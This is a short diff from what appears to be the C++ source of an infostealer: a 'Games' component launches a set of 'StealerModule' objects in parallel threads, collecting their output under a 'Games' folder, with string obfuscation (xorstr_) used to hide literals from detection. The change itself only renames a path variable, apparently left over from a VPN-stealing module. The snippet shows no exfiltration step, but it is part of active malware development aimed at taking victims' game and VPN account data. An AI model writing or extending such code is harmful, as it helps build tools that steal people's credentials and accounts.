@@ -14,12 +14,12 @@ Games::Games() {
 }
 
 void Games::execute(fs::path &root) {
-    fs::path vpns_path = root / xorstr_("Games");
+    fs::path games_path = root / xorstr_("Games");
     std::vector<std::thread> threads;
 
     for(StealerModule* module : this->modules) {
-        threads.emplace_back([module, &vpns_path]() {
-            module->execute(vpns_path);
+        threads.emplace_back([module, &games_path]() {
+            module->execute(games_path);
         });
     }
 
